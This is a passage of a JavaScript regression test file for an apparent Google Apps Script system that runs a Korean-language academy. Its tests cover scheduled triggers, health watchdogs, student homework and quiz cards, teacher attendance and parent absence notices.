      : (n === 'hw_feedback' ? mkSheet_([new Array(13).fill('h'),
        hw('S1', '포인트A', '조사:목적격(을/를), 어미:시제'),
        hw('S1', '포인트B', '조사:목적격(을/를), 오류없음'),
        hw('S1', '격리분', '높임:주체', '격리:품질'),
        hw('S1', '', '어휘:없는말', '노출', dOld),
        hw('S2', '', '맞춤법:받침')
      ]) : null))
  };
  const weak = aiWeakMap_(ss);
  const tail = weak['S1'][weak['S1'].length - 1];
  assert.ok(tail.indexOf('포인트B') === 0, '첨삭 최근 1건이 항목의 머리여야 한다(태그는 꼬리 접미)');
  assert.ok(tail.includes('조사:목적격(을/를) ×2'), '태그 빈도 상위(×2)가 꼬리에 안 실렸다');
  /* 🚫 아래 셋은 `코드만()` 대상이 아니다 — `tail` 은 소스 글이 아니라 `aiWeakMap_()` 이 **실행돼 나온 값**이다.
   *   계수기는 소스에서 온 함수의 산출까지 원문으로 물들여 세지만(그래서 여기가 🔴로 뜬다), 감싸면 뜻이 없다. */
  assert.equal(tail.includes('오류없음'), false, '「오류없음」이 약점으로 둔갑했다');
  assert.equal(tail.includes('높임:주체'), false, '격리 행의 태그가 약점 재료로 샜다');
  assert.equal(tail.includes('어휘:없는말'), false, '14일 창 밖 태그가 「최근 약점」으로 샜다');
  assert.equal(weak['S1'].length, 2, '태그 합류가 항목 수를 늘렸다 — slice(-2) 소비처에서 강사 손메모가 밀린다');
  assert.ok(weak['S1'][0].includes('은/는'), '강사 손메모가 사라졌다');
  assert.ok(weak['S2'] && weak['S2'][0].includes('맞춤법:받침'), '포인트 빈 행의 태그가 통째로 버려졌다');
  // 구 11열 시트(태그 열 미증분)에서 죽지 않는다 — 폭 클램프(1710 교훈과 같은 축)
  const old = aiWeakMap_({
    getSheetByName: (n) => (n === 'hw_feedback'
      ? mkSheet_([new Array(11).fill('h'), (() => { const r = new Array(11).fill(''); r[1] = 'S3'; r[5] = '옛포인트'; r[8] = '노출'; return r; })()], 11)
      : null)
  });
  assert.ok(old['S3'] && old['S3'][0] === '옛포인트', '구 11열 시트에서 약점맵이 죽거나 첨삭을 잃었다');
});

/* ── [v9.67] 감시 사각 3종 수리(2026-07-26 손타는 기능 진단 · 유호 승인) ─────────────── */

test('[v9.67] resetAllTriggers는 교재연동Nightly(23시)를 개통 시스템에 재설치한다(전체 삭제 실종 결함)', () => {
  const body = section('function resetAllTriggers(', 'const BIZ_BURN_DEFAULT');
  // 전체 삭제 루프 → 통합 10개 → 교재연동 조건 재설치 순서. 재설치가 빠지면 AI 문법판정·목소리·연습 노트가 조용히 죽는다.
  assertOrder(body, [
    'triggers.forEach(t => ScriptApp.deleteTrigger(t))',
    "newTrigger('monthlyReportJob')",
    'textbookLinkOn_()',
    "newTrigger('교재연동Nightly').timeBased().everyDays(1).atHour(23)"
  ]);
  // 설치 정본(setupTextbookLink)과 시각·주기가 어긋나면 두 경로가 서로 다른 시간에 트리거를 만든다
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  assert.ok(tb.includes("newTrigger('교재연동Nightly').timeBased().everyDays(1).atHour(23)"),
    '교재연동.js setupTextbookLink의 23시 설치 정본이 변형됨 — resetAllTriggers 재설치와 함께 바꿔야 한다');
});

/* [v9.211] 트리거 매니페스트 단일화 — 위 [v9.67] 수리가 「숫자·목록을 네 곳에 손으로 적는」 모양이라
 *   v9.164(onConsultEdit)에서 그대로 재발했다. 재발 형태가 두 방향이라 둘 다 회귀로 못박는다:
 *     거짓경보 = buildSystemManifest 기대 10 vs 실제 11 → 정상 상태에서 영구 ⚠(사람이 점검을 끈다)
 *     거짓 초록 = preflight·워치독이 onConsultEdit 실종을 못 봄(onEdit은 「조용히 안 도는 것」으로만 드러난다)
 *   ⚠ 이 테스트는 「버그가 아직 있을 것」을 요구하지 않는다 — 정상 상태에서 초록이고, **갈라질 때만** 빨개진다. */
test('[v9.211] 트리거 매니페스트가 정본이다 — 재설치 목록과 소비자 셋이 거기서 갈라지지 않는다', () => {
  /* 🔑 [2026-08-13] 지역 사본 → 파일 머리의 공용 통로(F401 계열). 옛 판은 문자열 속 `//`
   *   까지 먹어서 `'https://…'` 가 든 줄이 통째로 잘렸다 — 공용 판은 렉서라 그 자리를 살린다. */
  // [vNEXT·검수 31584c315c30] 매니페스트는 **실제로 실행해서** 반환값을 받는다 — 소스를 정규식으로 훑던
  //   첫 판은 파서가 곧 정본이 돼서, 배열 문법이 바뀌면(concat·전개) 무엇을 재는지 알 수 없었다.
  //   순수 함수(GAS API 0)라 node 에서 그대로 돈다. ⚠ resetAllTriggers 는 ScriptApp 을 부르므로
  //   런타임으로 못 돌린다 — 그쪽만 소스 대조이고, 그 비대칭은 여기 적어 둔다(가릴 것이 아니라 경계다).
  const mfSrc = section('function triggerManifest_(', '\nfunction resetAllTriggers(');
  const 매니페스트 = new Function(mfSrc + '\nreturn triggerManifest_;')();
  const 매니 = 매니페스트(true);
  assert.ok(Array.isArray(매니) && 매니.length >= 11, '매니페스트가 배열을 안 낸다(또는 목록이 줄었다)');
  assert.ok(매니.includes('onConsultEdit'), '매니페스트에 onConsultEdit이 없다 — v9.164 결함의 재발');
  assert.deepEqual(매니페스트(false), 매니.filter((h) => h !== '교재연동Nightly'),
    '교재연동 개통 여부로 갈리는 항목이 교재연동Nightly 하나가 아니다 — 미개통 시스템 오경보(v9.67이 닫은 자리)');

  // ① 실물 설치 목록과 집합이 같아야 한다. 한쪽만 늘면 그 순간부터 감시망이 갈라진다.
  const setup = 코드만(section('triggers.forEach(t => ScriptApp.deleteTrigger(t));', '트리거 통합 재설치 완료'));
  const 설치 = [];
  setup.replace(/newTrigger\('([^']+)'\)/g, (m, n) => { 설치.push(n); return m; });
  assert.deepEqual(매니.slice().sort(), 설치.slice().sort(),
    '트리거 매니페스트와 resetAllTriggers 재설치 목록이 갈라졌다 — 트리거를 늘리면 둘을 같은 커밋에서 고칠 것');

  // ② 소비자 셋이 손으로 적은 목록·숫자로 되돌아가지 않았는가
  const pre = 코드만(section('function preflightGlide()', 'function safeRun(name, fn)'));
  assert.ok(/const need = triggerManifest_\(tbOnP\)/.test(pre),
    'preflight 트리거 점검이 매니페스트 파생이 아니다 — 손 목록은 새 트리거의 실종을 영영 못 본다');
  assert.ok(pre.includes('textbookLinkOn_'), 'preflight 개통 발자국 조건 누락 — setupTextbookLink 미실행 시스템에 오경보');
  const wd = 코드만(section('function systemWatchdog(', 'function buildSystemManifest()'));
  assert.ok(/recommended = triggerManifest_\(textbookLinkOn_\(ss\)\)/.test(wd),
    '워치독 권장 목록이 매니페스트 파생이 아니다 — 주간 메일 감시망이 다시 갈라진다');
  // [vNEXT·검수 20a30d304f4c] 「필수 3」은 심각도 판정이라 매니페스트에서 파생할 수 없다(어느 것이 필수인지는
  //   별개 결정이다). 대신 **부분집합인지는 잴 수 있다** — 이름이 어긋나면 그 셋이 권장 목록에서 안 빠져
  //   중복 검사가 되고, 매니페스트 쪽 이름이 바뀌면 필수 검사가 영영 다른 것을 본다.
  const 필수 = [];
  (wd.match(/const 필수 = \[[^\]]*\]/) || [''])[0].replace(/'([^']+)'/g, (m, n) => { 필수.push(n); return m; });
  assert.ok(필수.length === 3, `워치독 필수 목록을 못 읽었다(읽은 것 ${필수.length}개) — 형태가 바뀌었으면 이 검사도 같이 고칠 것`);
  필수.forEach((f) => assert.ok(매니.includes(f),
    `워치독 필수 '${f}' 가 매니페스트에 없다 — 둘 중 하나의 이름이 바뀌었고, 그러면 필수 검사가 다른 것을 본다`));
  const mf = 코드만(section('function buildSystemManifest()', 'function checkConsultSync()'));
  assert.ok(/EXPECT_TRIGGERS = 기대핸들러\.length/.test(mf) && /기대핸들러 = triggerManifest_\(tbOnM\)/.test(mf),
    '매니페스트 기대치가 파생이 아니다');
  assert.ok(!/EXPECT_TRIGGERS = \d/.test(mf),
    '기대치에 숫자 리터럴이 다시 박혔다 — 트리거가 하나 늘 때마다 정상 상태가 ⚠로 뒤집힌다');
});

test('[v9.67] CLAUDE_API_KEY 휴면·첨삭 적체가 워치독·preflight·매니페스트에 뜬다(키 값은 절대 미노출)', () => {
  const health = section('function aiFeedbackHealth_(', 'function systemWatchdog(');
  assert.ok(health.includes("!!props.getProperty('CLAUDE_API_KEY')"), '키는 존재 여부 boolean만 — 값을 반환하면 로그·메일로 샌다');
  assert.ok(health.includes("'숙제폼_포인터'"), '적체 = 숙제폼_응답 포인터 뒤 신규 행 수(키 없으면 포인터가 멈추는 성질 이용)');
  const wd = section('function systemWatchdog(', 'function buildSystemManifest()');
  assert.ok(wd.includes('aiFeedbackHealth_(ss)'), '주간 워치독 계기 누락 — 키 휴면·적체가 다시 완전 침묵이 된다');
  const pre = section('function preflightGlide()', 'function safeRun(name, fn)');
  assert.ok(pre.includes('aiFeedbackHealth_(ss)'), 'preflight 계기 누락');
  const mf = section('function buildSystemManifest()', 'function checkConsultSync()');
  assert.ok(mf.includes("push('CLAUDE_API_KEY'"), '매니페스트 외부 의존성 줄 누락(NOTION_TOKEN만 점검하던 결함)');
});

test('[v9.67] 출석·숙제·목소리폼의 무효 sid 드롭은 무통보가 아니다(하루 1회 dedup 통보·자동 복구 없음)', () => {
  const att = section('function sweepAttendanceForm_(', 'function sweepFeedbackAck_(');
  assert.ok(att.includes("notifyDroppedSids_('출석폼', badSid)"), '출석폼 드롭 통보 누락');
  const fbk = section('function aiFeedbackBatch_()', 'function callClaudeFeedback_(');
  assert.ok(fbk.includes("notifyDroppedSids_('숙제폼', badSid)"), '숙제폼 드롭 통보 누락');
  // [v9.198] 강의 한줄요약이 같은 배치를 타므로 통보도 소스별 — 라벨이 「원본 행은 <라벨>_응답 탭」을 말한다.
  //   한 통에 합치면 강의폼에서 온 드롭을 「숙제폼_응답을 보세요」로 안내해 복구 경로가 어긋난다.
  assert.ok(fbk.includes("notifyDroppedSids_('강의폼', badLec)"), '강의 한줄요약 드롭 통보 누락');
  assert.ok(fbk.includes('if (sid && !stu) (it.ptr ? badSid : badLec).push(sid)'), '미등록 sid만 수집해야 한다(빈 ID·빈 문장은 폼 필수문항이라 제외)');
  const tb = fs.readFileSync(path.join(ROOT, '교재연동.js'), 'utf8');
  assert.ok(tb.includes("notifyDroppedSids_('목소리폼', badSid)"), '목소리폼 드롭 통보 누락(같은 결함 계급의 선제 수리)');
  const helper = section('function notifyDroppedSids_(', 'function sweepAttendanceForm_(');
  // dedup 필터 → 메일 발송 → 통보됨 마킹 순서 — 선마킹이면 큐 적재 실패 시 그날 통보가 영영 증발한다(safeRun 패턴)
  assertOrder(helper, ['무효sid통보_', 'seen.indexOf(s) === -1', 'adminMail(', 'props.setProperty(key']);
  assert.ok(helper.includes('포인터는 전진'), '메일이 "반영 안 됨 + 원본은 응답 탭에 있음"을 알려야 사람이 복구 경로를 안다');
});

test('[v9.68] schedule 시간 칸이 Date로 읽혀도 HH:mm으로 고정된다(교실스크린 1899 노출·시각 파싱 붕괴 차단)', () => {
  const hhmmOf_ = loadFunction('function hhmmOf_(', 'function scheduleMap(ss)', 'hhmmOf_', {
    Utilities: { formatDate: (d) => ('0' + d.getHours()).slice(-2) + ':' + ('0' + d.getMinutes()).slice(-2) }
  });
  // 구글시트가 '시간 서식' 셀을 돌려주는 실제 형태 — 1899-12-30 기준 Date
  assert.equal(hhmmOf_(new Date(1899, 11, 30, 11, 0, 0), 'Asia/Ulaanbaatar'), '11:00');
  assert.equal(hhmmOf_('9:00'), '09:00');
  assert.equal(hhmmOf_('9시'), '09:00');
  assert.equal(hhmmOf_('14:30'), '14:30'); // 정상 표기는 그대로 — 기존 표시 파괴 금지
  assert.equal(hhmmOf_(''), '');

  // 소비처(교실스크린·미등원 알림·수업 전 메일)가 아니라 단일 소스에서 정규화해야 4곳이 함께 낫는다
  const sm = section('function scheduleMap(ss)', 'function schedOf(map, cls)');
  assert.ok(sm.includes('hhmmOf_(r[2], tzSc)'), 'scheduleMap이 원본 String(r[2])로 되돌아가면 1899 문자열이 다시 샌다');
  assert.ok(!코드만(sm).includes('String(r[2])'), '원본 문자열화 잔재 — Date 오염 경로가 남는다');
});

test('[v9.69] 시트 자기치유가 야간에 돌고, 스토리북 병합은 v9.50 단일본 조립식을 그대로 쓴다', () => {
  const nj = section('function nightJobs()', 'function dailyBackupJob()');
  assert.ok(nj.includes("safeRun('sheetSelfHeal', sheetSelfHeal_)"),
    'nightJobs 편승 누락 — 구형 분권 호가 영영 소식탭에 파편으로 남는다');
  const heal = section('function sheetSelfHeal_()', 'const WORLD_HP_PER');
  assert.ok(heal.includes("'전문'"), '병합 행 챕터제목은 v9.50과 동일한 \'전문\'이어야 조립 바인딩이 안 갈린다');
  assert.ok(heal.includes("― ' + r[4] + ' ―"), '챕터 헤더 조립식이 v9.50 발간식과 달라지면 신·구 호의 본문 모양이 갈린다');
  assert.ok(heal.includes('sort((a, b) => b - a)') && heal.includes('deleteRow'),
    '잔여 행은 아래부터 물리 삭제해야 한다(행번호 밀림·Row ID 고아 방지)');
  assert.ok(heal.includes('Math.max.apply(null, rows.map(r => Number(r[3]) || 0))'),
    'world_raid 중복 정리는 누적데미지 최대값을 보존해야 진행분이 증발하지 않는다');
});

test('[v9.69] 고아 변형 선택자 청소는 비이모지 뒤 잔재만 걷고 정상 이모지 조합은 보존한다', () => {
  const cleaner = loadFunction('function orphanVsClean_(', 'function sheetSelfHeal_()', 'orphanVsClean_', {});
  assert.equal(cleaner('망각의 대군주 제로 \uFE0F와 시냅스의 불꽃'), '망각의 대군주 제로 와 시냅스의 불꽃');
  assert.equal(cleaner('7월의 보스 \u{1F573}\uFE0F 등장'), '7월의 보스 \u{1F573}\uFE0F 등장');
  assert.equal(cleaner(null), '');
});

test('[v9.69] 스토리 제목 이모지 제거가 변형 선택자·ZWJ까지 걷어낸다(고아 문자 재발 차단)', () => {
  const rx = /[\u{1F300}-\u{1FAFF}\u{2600}-\u{27BF}\uFE0E\uFE0F\u200D]/gu;
  assert.equal('망각의 대군주 제로 \u{1F573}\uFE0F'.replace(rx, '').trim(), '망각의 대군주 제로');
  const bnSeg = section('const bN = boss.name.replace', 'const J = josa');
  ['uFE0E','uFE0F','u200D'].forEach(esc => assert.ok(bnSeg.includes(esc), 'bN/wN 정규식에서 ' + esc + ' 누락 — 고아 문자 재발'));
});

test('[v9.69] 번역 대상에 grammar가 있고, 반복 체감 뱅크는 확장 하한을 지킨다', () => {
  assert.ok(code.includes("'monster', 'season', 'grammar']"),
    'translateContents targets에 grammar 누락 — setupGrammarBank 주석(자동 복원)과 코드가 다시 어긋난다');
  const pq = section('const PARENT_Q = [', '];');
  assert.ok((pq.match(/«/g) || []).length >= 12, '학부모 대화 카드 12문항 미만 — 4일 주기 반복 체감으로 회귀');
  // [함께한날 막6] 구 뱅크(miss7·evosoon·idle·today) 하한 검사는 뱅크와 함께 은퇴 — miss 계열은 발화표 S19
  //   (「끊김 절대 언급 ✗」)가 금지하는 축이라 «되살아나지 않는 것»이 새 회귀다.
  const sp = section('const SPEAK = {', 'const PARENT_Q');
  ['miss3:', 'miss7:', 'evosoon:', 'today:', 'idle:'].forEach(k =>
    assert.ok(sp.indexOf(k) === -1, 'SPEAK에 은퇴 뱅크 ' + k + ' 가 되살아났다(결석 재촉·진화 임박 축)'));
  const bd = sp.slice(sp.indexOf('bday:'));
  assert.ok((bd.match(/'/g) || []).length / 2 >= 4, 'bday 4문장 미만');
});

test('[v9.74] 숙제 카드 — 라벨 있는 완성 카드(과제·선생님 체크·제출 안내), 과제 없으면 미노출', () => {
  // [v9.83] 제출 안내가 "+nP"를 말하므로 실제 PT를 주입한다 — 5를 하드코딩하면 단가 드리프트를 못 잡는다
  // [v9.87] 시그니처 (ty, mnTy, task, mnTask, tip, mnTip) — 본문 몽골어 병기 슬롯 추가
  const hw = loadFunction('function hwCardHtml_(', 'function quizCardHtml_(', 'hwCardHtml_', { escHtml_: (s) => String(s), CARD_FONT: '', CARD_WEBFONT: '', PT: constObj_('const PT = {') });
  const html = hw('어휘', 'Үгийн сан', '오늘 배운 단어 중 2개를 한 문장 안에 같이 넣어 보세요.', 'Өнөөдөр сурсан үгнээс 2-ыг нэг өгүүлбэрт хамт оруулаад үзээрэй.', '의미 연결이 자연스러운지', 'Утгын холбоо');
  ['오늘의 숙제', '어휘', '오늘 배운 단어 중 2개', 'Өнөөдөр сурсан үгнээс', '선생님이 이걸 봐요', '의미 연결이 자연스러운지', '버튼으로 제출'].forEach((k) =>
    assert.ok(html.includes(k), '숙제 카드에 누락: ' + k));
  assert.ok(hw('어휘', '', '한 문장 만들기', '', '체크', '').indexOf('undefined') === -1, '빈 병기 슬롯이 undefined로 샌다');
  assert.equal(hw('어휘', '', '', '', '', ''), ''); // 게시 전 콜드스타트 — 빈 껍데기 카드 대신 미노출
});

test('[v9.74] 퀴즈 카드 — 문제와 공개 안내만, 정답은 어떤 경로로도 카드에 담기지 않는다(언어정책)', () => {
  // [v9.87] 시그니처 (q, mnQ, personal) — 본문 몽골어 병기 슬롯 추가(병기도 문제부만, 정답부 금지는 ⑤에서 검사)
  const quiz = loadFunction('function quizCardHtml_(', 'function prepCardHtml_(', 'quizCardHtml_', { escHtml_: (s) => String(s), CARD_FONT: '', CARD_WEBFONT: '' });
  const html = quiz('감사합니다의 실제 발음은?', '', false);
  assert.ok(html.includes('오늘의 퀴즈') && html.includes('감사합니다의 실제 발음은?') && html.includes('정답 공개'));
  assert.ok(quiz('문제', '', true).includes('맞춤 문제'), '개인 퀴즈(ai_daily) 라벨 누락');
  assert.ok(quiz('문제', 'Монгол асуулт', false).includes('Монгол асуулт'), '몽골어 병기가 렌더되지 않는다');
  assert.equal(quiz('', '', false), '');
  // 호출부가 문제(q[0]·pq.q)만 넘기는지 — 정답(q[1]·pq.a)이 카드로 새는 회귀 차단
  assert.ok(code.includes('quizCardHtml_(pq ? pq.q : q[0], mnQ9, !!pq)'), '퀴즈 카드 호출부는 문제(한·몽)만 넘겨야 한다');
  const fnQ = section('function quizCardHtml_(', 'function prepCardHtml_(');
  assert.ok(!코드만(fnQ).includes('quizAns'), '퀴즈 카드 빌더에 정답 인자가 생기면 언어정책(정답 평문 노출 금지) 위반');
});

test('[v9.74] 수업준비 카드 — 검사 포인트의 제자리는 강사 화면, 워밍업 퀴즈는 정답 동봉', () => {
  const prep = loadFunction('function prepCardHtml_(', 'function teacherInOutMap_(', 'prepCardHtml_', { escHtml_: (s) => String(s), CARD_FONT: '', CARD_WEBFONT: '' });
  const html = prep('어휘', '단어 3개로 문장 만들기', '조사 확인', '같이의 발음은?', '가치 — 구개음화');
  ['수업 준비', '오늘 검사할 숙제', '검사 포인트 — 조사 확인', '워밍업 퀴즈', '정답 — 가치'].forEach((k) =>
    assert.ok(html.includes(k), '수업준비 카드에 누락: ' + k));
  assert.ok(prep('', '', '', '', '').includes('게시된 숙제 없음'));
});

test('[v9.74] 출퇴근 중복 방어 — 첫 출근·마지막 퇴근 집계, 강사 행만 갱신, 응원 메일 당일 1회·발송 후 마킹', () => {
  const io = section('function teacherInOutMap_(', 'function updateTeacherInOut_(');
  assert.ok(io.includes('d < m.tin') && io.includes('d > m.tout'), '중복 탭 무해화(첫 출근·마지막 퇴근) 집계가 없다');
  const upd = section('function updateTeacherInOut_(', 'function writeSharedCols_(');
  assert.ok(upd.includes("String(r[3]) !== 'teacher'"), '강사 행 한정 갱신이 없다(학생·학부모 행 침범 위험)');
  assert.ok(upd.includes("!== '오늘출근'"), '공유열 미생성 콜드스타트 가드가 없다');
  assert.ok(upd.includes('SHARED2_COL_START') && upd.includes('hhmmOf_(cur[i][0], tz)'),
    '2차 블록 주소·hhmmOf_ 정규화 비교(리뷰 B1·B2)가 없다 — 선점 열 침범 또는 10분 재기입 루프');
  assert.ok(section('function writeSharedCols_(', 'const HEADS_ALL').includes("setNumberFormat('@')"),
    '출퇴근 열 텍스트 서식 고정(리뷰 B2)이 없다 — HH:mm이 1899 Date로 되읽혀 재기입 루프(v9.68 계급)');
  assert.ok(section('function todayBoard_(', '교실 스크린').includes('updateTeacherInOut_(ss, tz, pf)'), '10분 스위프 갱신 배선이 없다');
  const co = section('function checkoutCheerMail_(', 'function sweepLeadForm_(');
  assert.ok(co.includes("sentNames.indexOf('|' + who + '|')"), '당일 1회/강사 가드가 없다');
  assertOrder(co, ['MailApp.sendEmail(email', 'props.setProperty(sentKey']); // 발송 성공분만 마킹
  assert.ok(co.includes('!quotaOk(1)) break'), '쿼터 소진 시 포인터 전진 없는 중단(리뷰 H2 — 재시도 보장)이 없다');
  assertOrder(co, ["props.deleteProperty('퇴근응원_'", "Number(props.getProperty('퇴근메일_포인터'))"]); // 어제 키 청소는 조기 return보다 앞(리뷰 L1)
});

test('[v9.82] 출퇴근 카드 — 상태 3단 렌더·근무시간 확정값·스위프가 카드도 변경시만 기입', () => {
  const io = loadFunction('function ioCardHtml_(', 'function absenceCardHtml_(', 'ioCardHtml_',
    { escHtml_: (s) => String(s == null ? '' : s), CARD_FONT: '', CARD_WEBFONT: '', HUD_CARD: '', HUD_LABEL: '' });
  const cells = [{ d: '월', s: 'done' }, { d: '화', s: 'today' }];
  assert.ok(io('7/31 (금)', { in: '', out: '' }, cells, 1, '').includes('출근 전'));
  const work = io('7/31 (금)', { in: '09:12', out: '' }, cells, 1, '금요일 화이팅');
  assert.ok(work.includes('근무 중') && work.includes('09:12') && work.includes('금요일 화이팅'), '근무 중 상태·출근 시각·요일 치어 누락');
  const done = io('7/31 (금)', { in: '09:12', out: '18:40', mins: 508 }, cells, 1, '');
  assert.ok(done.includes('퇴근 완료') && done.includes('8시간 28분'), '퇴근 완료 상태·근무시간(508분=8시간 28분) 누락');
  assert.ok(io('7/31 (금)', { in: '09:12', out: '09:12', mins: 0 }, cells, 1, '').indexOf('0분') === -1, '0분 근무 표기(동시각 중복 탭)가 노출되면 안 된다');
  // 소유자(10분 스위프)가 시각 2열과 함께 카드도 갱신 + 학부모 결석 카드 배선
  const upd = section('function updateTeacherInOut_(', 'function writeSharedCols_(');
  assert.ok(upd.includes("'출퇴근HTML'") && upd.includes('ioCardHtml_('), '스위프가 출퇴근 카드를 갱신하지 않는다');
  assert.ok(upd.includes('updateParentAbsence_') && upd.includes("'결석신고HTML'"), '학부모 결석 카드 스위프 갱신 함수가 없다');
  assert.ok(section('function todayBoard_(', '교실 스크린').includes('updateParentAbsence_(ss, tz, pf)'), '결석 카드 10분 배선(todayBoard_)이 없다');
});

test('[v9.86] 수업준비 팩 — 결석 예정 HUD·조 편성 절·제출 현황·교안 초안 배선', () => {
  // A: 결석 예정(학부모 사전신고) — 메일에만 있던 것이 HUD 미션 절로
  const rowsFn = section('function hudBriefRows_(', 'function buildBriefHud_(');
  assert.ok(rowsFn.includes("'결석 예정'") && rowsFn.includes('mats.preAbs'), 'HUD 결석 예정 행이 없다');
  assert.ok(code.includes('preAbs: preAbsByCls[c]'), 'calcAll mats에 preAbs 배선이 없다');
  // B: 조 편성 절 — 상세 join 인자 + 배치 헬퍼(반복 재읽기 방지) + 렌더 3태
  const det = section('function buildClassHudDetail_(', 'function buildGroupHud_(');
  assert.ok(det.includes('groupHtml'), '반 상세에 조 편성 절 인자가 없다');
  const gh = loadFunction('function buildGroupHud_(', 'function groupHudsByClass_(', 'buildGroupHud_',
    Object.assign({ escHtml_: (s) => String(s == null ? '' : s), CARD_FONT: '', CARD_WEBFONT: '', HUD_CARD: '', HUD_LABEL: '', hudChip_: (s) => String(s) },
      groupConsts())); // [v9.99] 상수는 하드코딩하지 않고 Code.js 정본에서 실값을 뽑아 주입
  const gHtml = gh('', { lessonNo: 7, week: 2, confirmed: '확정', groups: [[{ name: '바야르', seat: 0, role: '발표', icon: '📢' }, { name: '사라', seat: 1, role: '진행', icon: '🎯' }]] });
  assert.ok(gHtml.includes('조 편성') && gHtml.includes('오늘 발표') && gHtml.includes('바야르'), '조 편성 절 렌더 누락(발표 콜아웃 포함)');
  assert.equal(gh('', { lessonNo: 0, week: 0, groups: [] }), '', '편성 전엔 절이 생략돼야 한다(도입 전 잔소리 방지)');
  assert.ok(gh('', { lessonNo: 3, week: 1, confirmed: '임시', groups: [[{ name: 'A', seat: 0, role: '진행', icon: '🎯' }]] }).includes('임시 조'), '임시 조 필 누락');
  assert.ok(code.includes('groupHudByCls[c]') && code.includes('groupHudsByClass_(ss, tz, now)'), 'calcAll 배선(1회 읽기 배치)이 없다');
  // C: 수업준비 카드 제출 현황(검사 동선) — 하위 호환 + 미제출 캡 + 전원 제출
  const prep = loadFunction('function prepCardHtml_(', 'function teacherInOutMap_(', 'prepCardHtml_', { escHtml_: (s) => String(s == null ? '' : s), CARD_FONT: '', CARD_WEBFONT: '' });
  const wSubs = prep('어휘', '숙제', '', '', '', [{ c: '정규반1', done: 9, total: 13, missing: ['가', '나', '다', '라', '마', '바'] }]);
  assert.ok(wSubs.includes('제출 현황') && wSubs.includes('9/13') && wSubs.includes('외 1명'), '제출 현황 절·미제출 캡 누락');
  assert.ok(prep('어휘', '숙제', '', '', '', [{ c: '정규반1', done: 3, total: 3, missing: [] }]).includes('전원 제출'), '전원 제출 표기 누락');
  assert.ok(prep('어휘', '숙제', '', '', '').indexOf('제출 현황') === -1, 'subs 없으면 절이 생략돼야 한다(하위 호환)');
  assert.ok(section('function writeSharedCols_(', '/* ===================== 상담시트').includes('subsT'), '강사 분기에 제출 현황 재료가 없다');
  // D: 주간 교안 초안 — weeklyJobs 편승·멱등(강사 편집 보존)·미배포 가드·과업 은행 20종
  const wj = section('function weeklyJobs()', 'function monthlyJobs');
  assert.ok(wj.includes('lessonPlanDrafts_') && wj.includes('주간 교안 초안'), 'weeklyJobs에 교안 초안 편승이 없다');
  const lp = section('function lessonPlanDrafts_(', 'function lessonPlanTaskFor_(');
  assert.ok(lp.includes('getFilesByName') && lp.includes('기존 유지'), '멱등(기존 문서 보존) 가드가 없다 — 강사 편집이 매주 덮인다');
  assert.ok(lp.includes("typeof LESSON_TASK_BANK === 'undefined'"), 'contents_교안.js 미배포 가드가 없다(v9.57 크로스파일 계급)');
  const bank = fs.readFileSync(path.join(ROOT, 'contents_교안.js'), 'utf8');
  const ids = [...bank.matchAll(/\['(T-\d\d)'/g)].map((m) => m[1]);
  assert.equal(ids.length, 20, '과업 은행은 20종이어야 한다');
  assert.equal(new Set(ids).size, 20, '과업 ID가 중복됐다');
  assert.ok(JSON.parse(fs.readFileSync(path.join(ROOT, '.clasp.json'), 'utf8')).filePushOrder.indexOf('contents_교안.js') > -1, 'filePushOrder에 contents_교안.js 누락');
});

test('[v9.82] 결석 신고 카드 — 접수 확인 3태·빈 상태·사유 이스케이프·재계산 동일값', () => {
  const ab = loadFunction('function absenceCardHtml_(', 'function teacherInOutMap_(', 'absenceCardHtml_',
    { escHtml_: (s) => String(s == null ? '' : s).replace(/</g, '&lt;'), CARD_FONT: '', CARD_WEBFONT: '' });
  const html = ab('바야르', [{ label: '8/1 (금)', state: 'future', reason: '<병원>' }], ['8/1 (금)', '8/4 (월)']);
  assert.ok(html.includes('접수됨') && html.includes('바야르') && html.includes('다음 수업일'), '접수 확인·자녀명·다음 수업일 누락');
  assert.ok(html.indexOf('<병원>') === -1 && html.includes('&lt;병원>'), '사유가 이스케이프되지 않는다(HTML 주입)');
  assert.ok(ab('바야르', [{ label: '7/31 (목)', state: 'today', reason: '' }], []).includes('오늘'), '오늘 신고 상태 표기가 없다');
  assert.ok(ab('바야르', [], []).includes('아직 등록된 신고가 없어요'), '빈 상태 안내가 없다');
  // 14/22시 재계산(writeSharedCols_)이 스위프와 같은 빌더로 같은 값을 채워 카드를 지우지 않는다
  const fn = section('function writeSharedCols_(', '/* ===================== 상담시트');
  assert.ok(fn.includes('ioCardHtml_(') && fn.includes('absenceCardHtml_('), '공유열 재계산이 새 카드 2종을 채우지 않는다 — 14/22시마다 카드가 지워진다');
  assert.ok(code.includes('결석 신고 student_id 불일치'), 'preflight 결석 신고 무결성 검사(다자녀 통짜 기록 회귀 장치)가 없다');
});

test('[v9.74] 학부모 접점에서 몬스터 호칭 제거 — 성장 파트너(хамтрагч), 학생 세계관은 유지', () => {
  assert.ok(code.includes('도장이 쌓일수록 성장 파트너가 자라요'), '출석달력 캡션 교체 누락');
  assert.ok(!코드정제.includes('도장이 채워질수록 몬스터가 자라요'), '구 캡션 잔존');
  // [함께한날 막6] 진화 학부모 메일은 checkEvolution 과 함께 소각 — 장면 소식은 인앱 배너(BN66)가 진다
  assert.ok(!코드정제.includes('학생의 성장 파트너가 진화했어요') && !코드정제.includes('학생의 몬스터가 진화했어요'), '소각된 진화 학부모 메일이 되살아났다');
  assert.ok(!코드정제.includes('-ийн монстр'), '학부모 몽골어 배너·하이라이트에 монстр 잔존'); // 학생용(운세 "дараагийн монстр"·onboarding "таны монстр")은 세계관 유지로 남는다
  const pq = section('const PARENT_Q = [', '];');
  assert.ok(pq.indexOf('монстр') === -1 && pq.indexOf('네 몬스터') === -1, '학부모 대화 카드에 몬스터 잔존');
  const hl = section('const HL_TPL = [', '];');
  assert.ok(hl.indexOf('монстр') === -1 && hl.indexOf('몬스터') === -1, '학부모 하이라이트에 몬스터 잔존');
});

test('[v9.74] 학업 기록 폼 — 재실행 가드·10분 전개(값 검증·AL 채번·미매칭 통보)·아침 동기화·켜기 큐 감시', () => {
  const cf = section('function createAcademicForm()', 'function importFormResponses()');
  assertOrder(cf, ['syncAcademicForm_(ss, st)', 'FormApp.create']); // 있으면 제자리 업그레이드, 없을 때만 생성(URL 갈아끼움 사고 차단)
  const sw = section('function sweepAcademicForm_(', '첨삭 품질 게이트');
  assert.ok(sw.includes("props.setProperty('학업폼_포인터', String(last))"), '포인터 마감 누락');
